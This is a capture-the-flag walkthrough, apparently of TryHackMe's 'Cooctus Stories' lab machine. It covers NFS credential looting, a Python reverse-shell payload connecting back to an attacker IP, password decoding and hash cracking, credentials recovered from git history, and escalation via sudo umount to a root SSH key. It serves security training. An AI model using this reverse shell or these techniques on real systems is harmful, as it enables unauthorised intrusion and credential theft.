# Cooctus Stories

This room is about the Cooctus Clan.

**Previously on Cooctus Tracker**

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened. (From Overpass 2 - Hacked by NinjaJc01)

**Present times**

Further investigation revealed that the hack was made possible by the help of an insider threat. Paradox helped the Cooctus Clan hack overpass in exchange for the secret shiba stash. Now, we have discovered a private server deep down under the boiling hot sands of the Saharan Desert. We suspect it is operated by the Clan and it's your objective to uncover their plans.

Note: A stable shell is recommended, so try and SSH into users when possible.

# Paradox is nomming cookies

*Hint: Confront the CAT!*

## Services

~~~
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37644/udp6  mountd
|   100005  1,2,3      41390/udp   mountd
|   100005  1,2,3      49245/tcp6  mountd
|   100005  1,2,3      59977/tcp   mountd
|   100021  1,3,4      34839/tcp6  nlockmgr
|   100021  1,3,4      35275/udp   nlockmgr
|   100021  1,3,4      36517/tcp   nlockmgr
|   100021  1,3,4      40081/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
36517/tcp open  nlockmgr 1-4 (RPC #100021)
43101/tcp open  mountd   1-3 (RPC #100005)
55387/tcp open  mountd   1-3 (RPC #100005)
59977/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## NFS

There is a NFS network share that reveals credentials:

* Username: paradoxial.test
* Password: ShibaPretzel79

~~~
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ mkdir tmp  
                                                                                                                     
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ sudo mount -t nfs 10.10.94.63: tmp 
                                                                                                                     
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ tree tmp 
tmp
└── var
    └── nfs
        └── general
            └── credentials.bak

3 directories, 1 file
                                                                                                                     
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ cat tmp/var/nfs/general/credentials.bak 
paradoxial.test
ShibaPretzel79
~~~

## Web

There is a web service running on port 8080. There is no `robots.txt` file but the enumeration reveals 2 locations.

~~~
└─$ gobuster dir -u http://10.10.94.63:8080 -w /usr/share/wordlists/dirb/common.txt                            5 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.94.63:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/28 09:46:41 Starting gobuster in directory enumeration mode
===============================================================
/cat                  (Status: 302) [Size: 219] [--> http://10.10.94.63:8080/login]
/login                (Status: 200) [Size: 556]                                      
                                                                                     
===============================================================
2021/05/28 09:47:35 Finished
===============================================================
~~~

We can login (http://10.10.94.63:8080/login) using the credentials found just previously. Once logged in, we are redirected to the `/cat` page.

## Reverse Shell

After playing a bit with the form and payloads, I was able to send the following payload (python reverse shell):

~~~
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

We now have a reverse shell:

~~~
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.94.63] 35218
bash: cannot set terminal process group (726): Inappropriate ioctl for device
bash: no job control in this shell
paradox@cchq:~$ pwd
pwd
/home/paradox
~~~

## Paradox Flag

~~~
paradox@cchq:~$ ll
ll
total 36
drwxr-xr-x 5 paradox paradox 4096 Feb 22 18:48 ./
drwxr-xr-x 6 root    root    4096 Jan  2 10:24 ../
lrwxrwxrwx 1 paradox paradox    9 Feb 20 17:13 .bash_history -> /dev/null
-rw-r--r-- 1 paradox paradox  220 Jan  2 10:24 .bash_logout
-rw-r--r-- 1 paradox paradox 3882 Feb 20 21:50 .bashrc
drwx------ 2 paradox paradox 4096 Jan  2 18:31 .cache/
drwxr-xr-x 4 paradox paradox 4096 Jan  1 22:03 CATapp/
drwx------ 3 paradox paradox 4096 Jan  2 18:31 .gnupg/
-rw-r--r-- 1 paradox paradox  807 Jan  2 10:24 .profile
-rw------- 1 paradox paradox   38 Feb 20 20:23 user.txt
paradox@cchq:~$ cat user.txt
cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}
~~~

Paradox flag: `THM{2dccd1ab3e03990aea77359831c85ca2}`

# Find out what Szymex is working on

*Hint: Locating shipment...*

## The SniffingCat.py script

Add your SSH public key to `/home/paradox/.ssh/authorized_keys` and connect via SSH directly as `paradox`. When we connect, we can notice a message displayed every minute:

~~~
Broadcast message from szymex@cchq (somewhere) (Fri May 28 09:52:01 2021):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Fri May 28 09:52:01 2021):     
                                                                               
Coordinates: X: 306, Y: 26, Z: 9
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Fri May 28 09:53:01 2021):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Fri May 28 09:53:01 2021):     
                                                                               
Coordinates: X: 567, Y: 48, Z: 815                                              
~~~

There is a note in the home folder, as well as a python script (`SniffingCat.py`):

~~~
paradox@cchq:/home/szymex$ ll
total 44
drwxr-xr-x 5 szymex szymex 4096 Feb 22 18:45 ./
drwxr-xr-x 6 root   root   4096 Jan  2 10:24 ../
lrwxrwxrwx 1 szymex szymex    9 Feb 20 17:13 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2 09:13 .bash_logout
-rw-r--r-- 1 szymex szymex 3865 Feb 20 21:27 .bashrc
drwx------ 2 szymex szymex 4096 Jan  2 09:27 .cache/
drwx------ 3 szymex szymex 4096 Jan  2 21:44 .gnupg/
drwxrwxr-x 3 szymex szymex 4096 Jan  2 10:59 .local/
-r-------- 1 szymex szymex   11 Jan  2 14:18 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20 20:31 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20 20:30 SniffingCat.py*
-rw------- 1 szymex szymex   38 Feb 22 18:45 user.txt
paradox@cchq:/home/szymex$ cat note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
~~~

Checking the crontab confirms that the script is called by `szymex` and runs every minute:

~~~
paradox@cchq:/home/szymex$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * * 	szymex	/home/szymex/SniffingCat.py
#
~~~

Below is the script:

~~~
paradox@cchq:/home/szymex$ cat SniffingCat.py 
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
~~~

The script above provides us with the encoded form of a password: `pureelpbxr`. Now, we need to reverse it.

## Reverse engineer the password

The script is applying a transformation to the password in clear (saved in `mysupersecretpassword.cat`) and displays the message if the encoded password is equal to `pureelpbxr`. Let's build a quick and dirty python script that will get each letter of the alphabet, and apply the transformation, to build a conversion table.

```python                                                                                                                     
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ cat test.py                            
#!/usr/bin/python3

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

s = 'abcdefghijklmnopqrstuvwxyz'
clear = list(s)
encoded = list(encode(s))

pwd = "pureelpbxr"
dec = ""

for i in pwd:
    dec += clear[encoded.index(i)]

print(dec)
```

Running the script will reveal the password in the clear:

~~~
$ python3 test.py
cherrycoke
~~~

## Lateral move (paradox -> szymex)

Now we can move to `szymex` and read the password:

~~~
paradox@cchq:/home/szymex$ su szymex
Password: 
szymex@cchq:~$ id
uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers)
szymex@cchq:~$ cd /home/szymex/
szymex@cchq:~$ ll
total 44
drwxr-xr-x 5 szymex szymex 4096 Feb 22 18:45 ./
drwxr-xr-x 6 root   root   4096 Jan  2 10:24 ../
lrwxrwxrwx 1 szymex szymex    9 Feb 20 17:13 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2 09:13 .bash_logout
-rw-r--r-- 1 szymex szymex 3865 Feb 20 21:27 .bashrc
drwx------ 2 szymex szymex 4096 Jan  2 09:27 .cache/
drwx------ 3 szymex szymex 4096 Jan  2 21:44 .gnupg/
drwxrwxr-x 3 szymex szymex 4096 Jan  2 10:59 .local/
-r-------- 1 szymex szymex   11 Jan  2 14:18 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20 20:31 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20 20:30 SniffingCat.py*
-rw------- 1 szymex szymex   38 Feb 22 18:45 user.txt
szymex@cchq:~$ cat user.txt 
THM{c89f9f4ef264e22001f9a9c3d72992ef}
~~~

Szymex's flag: `THM{c89f9f4ef264e22001f9a9c3d72992ef}`

# Find out what Tux is working on

*Hint: Combine and crack*

## First fragment

From the note left in the home folder, we understand that we have to collect 3 fragments:

~~~
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
~~~

The first fragment can be found in the `nootcode.c` program. Compiling the program won't help, but we see replacements to make, from the `define statements`:

```c
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c 
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

Let's use `sed` to make these replacements quickly:

~~~
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c \
> | sed 's/noot/int/g' \
> | sed 's/Noot/main/g' \
> | sed 's/nOot/return/g' \
> | sed 's/noOt/(/g' \
> | sed 's/nooT/)/g' \
> | sed 's/NOOOT/"f96"/g' \
> | sed 's/NooT/;/g' \
> | sed 's/Nooot/nuut/g' \
> | sed 's/NOot/{/g' \
> | sed 's/nooot/key/g' \
> | sed 's/NoOt/}/g' \
> | sed 's/NOOt/void/g' \
> | sed 's/NOOT/"NOOT!\n"/g' \
> | sed 's/nooOT/"050a"/g' \
> | sed 's/noOT/printf/g' \
> | sed 's/nOOT/0/g' \
> | sed 's/nOoOoT/"What does the penguin say?\n"/g' \
> | sed 's/nout/"d61"/g'
#include <stdio.h>

#define int int
#define main main
#define return return
#define ( (
#define ) )
#define "f96" "f96"
#define ; ;
#define nuut nuut
#define { {
#define key key
#define } }
#define void void
#define "NOOT!
" ""NOOT!
"!\n"
#define "050a" "050a"
#define printf printf
#define 0 0
#define "What does the penguin say?
" "What does the penguin say?\n"
#define "d61" "d61"

int main ( ) {
    printf ( "What does the penguin say?
" ) ;
    nuut ( ) ;

    return 0 ;
}

void key ( ) {
    printf ( "f96" "050a" "d61" ) ; <------------------ first fragment
}

void nuut ( ) {
    printf ( "NOOT!
" ) ;
}
~~~

First fragment: `f96050ad61`

## Second fragment

Based on the name of the directory where we found the 1st fragment, we can search for other folders with the same name structure:

~~~
szymex@cchq:/home/tux$ find / -type d -name "tuxling*" 2>/dev/null
/home/tux/tuxling_3
/home/tux/tuxling_1
/media/tuxling_2
~~~

The second fragment is in a PGP crypted file: 

~~~
szymex@cchq:/media/tuxling_2$ cat note 
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!

szymex@cchq:/media/tuxling_2$ ll
total 20
drwxrwx--- 2 tux  testers 4096 Feb 20 20:02 ./
drwxr-xr-x 3 root root    4096 Feb 20 21:04 ../
-rw-rw-r-- 1 tux  testers  740 Feb 20 20:00 fragment.asc
-rw-rw---- 1 tux  testers  280 Jan  2 20:20 note
-rw-rw-r-- 1 tux  testers 3670 Feb 20 20:01 private.key
~~~

To decrypt the message, let's import the private key.

~~~
szymex@cchq:/media/tuxling_2$ gpg --import private.key 
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc 
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
~~~

Second fragment: `6eaf62818d`

## Third fragment

The 3rd and last fragment was in a hidden directory in tux's home:

~~~
szymex@cchq:/home/tux$ cat tuxling_3/note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
~~~

## Crack fragments hash

All fragments join the following hash: `f96050ad616eaf62818d637b56db1552`

Using [crackstation](https://crackstation.net/), we find that the password is `tuxykitty`.

## Tux's flag

~~~
$ sshpass -p "tuxykitty" ssh tux@10.10.94.63
tux@cchq:~$ cat user.txt 
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
~~~

Tux's flag: `THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}`

# Find out what Varg is working on

*Hint: Boot sequence initiated...*

`tux` can run the `CooctOS.py` program as `varg` without password:

~~~
tux@cchq:~$ cd /home/varg/
tux@cchq:/home/varg$ ll
total 48
drwxr-xr-x  7 varg varg      4096 Feb 20 22:06 ./
drwxr-xr-x  6 root root      4096 Jan  2 10:24 ../
lrwxrwxrwx  1 varg varg         9 Feb 20 14:54 .bash_history -> /dev/null
-rw-r--r--  1 varg varg       220 Jan  2 10:24 .bash_logout
-rw-r--r--  1 varg varg      3771 Jan  3 11:40 .bashrc
drwx------  2 varg varg      4096 Jan  3 12:53 .cache/
-rwsrws--x  1 varg varg      2146 Feb 20 22:05 CooctOS.py*
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 cooctOS_src/
-rw-rw-r--  1 varg varg        47 Feb 20 15:46 .gitconfig
drwx------  3 varg varg      4096 Jan  3 12:53 .gnupg/
drwxrwxr-x  3 varg varg      4096 Jan  3 10:22 .local/
drwx------  2 varg varg      4096 Feb 20 14:17 .ssh/
-rw-------  1 varg varg        38 Feb 20 21:08 user.txt
tux@cchq:/home/varg$ sudo -l
Matching Defaults entries for tux on cchq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
~~~

We can't read the python script, but there is a `.git` repository in the `cooctOS_src` folder. Running `git show` reveals the source of the program and discloses new credentials:

~~~
tux@cchq:/home/varg$ cd cooctOS_src/
tux@cchq:/home/varg/cooctOS_src$ ll
total 44
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 ./
drwxr-xr-x  7 varg varg      4096 Feb 20 22:06 ../
drwxrwx---  2 varg os_tester 4096 Feb 20 15:46 bin/
drwxrwx---  4 varg os_tester 4096 Feb 20 15:22 boot/
drwxrwx---  2 varg os_tester 4096 Feb 20 15:10 etc/
drwxrwx---  2 varg os_tester 4096 Feb 20 15:41 games/
drwxrwxr-x  8 varg os_tester 4096 Feb 20 15:47 .git/
drwxrwx---  3 varg os_tester 4096 Feb 20 14:44 lib/
drwxrwx--- 16 varg os_tester 4096 Feb 20 15:21 run/
drwxrwx---  2 varg os_tester 4096 Feb 20 09:11 tmp/
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:20 var/
tux@cchq:/home/varg/cooctOS_src$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
@@ -1,52 +0,0 @@
-#!/usr/bin/python3
-
-import time
-import os;
-import pty;
-
-#print(chr(27)+ "[2J")
-logo = """\033[1;30;49m
- ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
-██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝\033[1;37;49m██╔═══██╗██╔════╝\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
-╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
- ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
-"""
-print(logo)
-print("                       LOADING")
-print("[", end='')
-
-for i in range(0,60):
-    #print(chr(27)+ "[2J")
-    #print(logo)
-    #print("                       LOADING")
-    print("[", end='')
-    print("=" * i, end='')
-    print("]")
-    time.sleep(0.02)
-    print("\033[A\033[A")
-
-print("\032")
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
-
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork": <------------------------------------- Credentials
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break
~~~

## Lateral move (tux -> varg)

Now, we can connect as `varg` and read the flag.

~~~
$ sshpass -p "slowroastpork" ssh varg@10.10.94.63
varg@cchq:~$ cat user.txt 
THM{3a33063a4a8a5805d17aa411a53286e6}
~~~

Varg's flag: `THM{3a33063a4a8a5805d17aa411a53286e6}`

# Get full root privileges

*Hint: To mount or not to mount. That is the question.*

Varg can run `umount` as root without password. However, checking on GTFOBins doesn't reveal any privilege escalation with `umount`.

~~~
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
~~~

Checking in the `fstab` file reveals that there is a mounted partition in `/opt/CooctFS`:

~~~
varg@cchq:~$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo	/	ext4	defaults	0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3	/boot	ext4	defaults	0 0
#/swap.img	none	swap	sw	0 0
/home/varg/cooctOS_src	/opt/CooctFS	none	defaults,bind	0 0
~~~

Unmounting the partition reveals a `root` folder:

~~~
varg@cchq:~$ cd /opt/CooctFS/
varg@cchq:/opt/CooctFS$ ll
total 44
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 ./
drwxr-xr-x  3 root root      4096 Feb 20 14:30 ../
drwxrwx---  2 varg os_tester 4096 Feb 20 15:46 bin/
drwxrwx---  4 varg os_tester 4096 Feb 20 15:22 boot/
drwxrwx---  2 varg os_tester 4096 Feb 20 15:10 etc/
drwxrwx---  2 varg os_tester 4096 Feb 20 15:41 games/
drwxrwxr-x  8 varg os_tester 4096 Feb 20 15:47 .git/
drwxrwx---  3 varg os_tester 4096 Feb 20 14:44 lib/
drwxrwx--- 16 varg os_tester 4096 Feb 20 15:21 run/
drwxrwx---  2 varg os_tester 4096 Feb 20 09:11 tmp/
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:20 var/
varg@cchq:/opt/CooctFS$ cd
varg@cchq:~$ sudo /bin/umount /opt/CooctFS 
varg@cchq:~$ ls -la /opt/CooctFS/
total 12
drwxr-xr-x 3 root root 4096 Feb 20 09:09 .
drwxr-xr-x 3 root root 4096 Feb 20 14:30 ..
drwxr-xr-x 5 root root 4096 Feb 20 09:16 root
~~~

And there is a `root.txt` file there, but it's not the root flag.

~~~
varg@cchq:~$ cat /opt/CooctFS/root/root.txt 
hmmm...
No flag here. You aren't root yet.
~~~

## Root flag

That said, we can find the root SSH private key (`/opt/CooctFS/root/.ssh/id_rsa`). Save it locally, give it the proper permissions, and use it to connect as `root`:

~~~
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ chmod 400 root.key                                  
                                                                                                                     
┌──(kali㉿kali)-[/data/Cooctus_Stories/files]
└─$ ssh -i root.key root@10.10.94.63                    
root@cchq:~# cat /root/root.txt 
THM{H4CK3D_BY_C00CTUS_CL4N}
~~~

Root flag: `THM{H4CK3D_BY_C00CTUS_CL4N}`
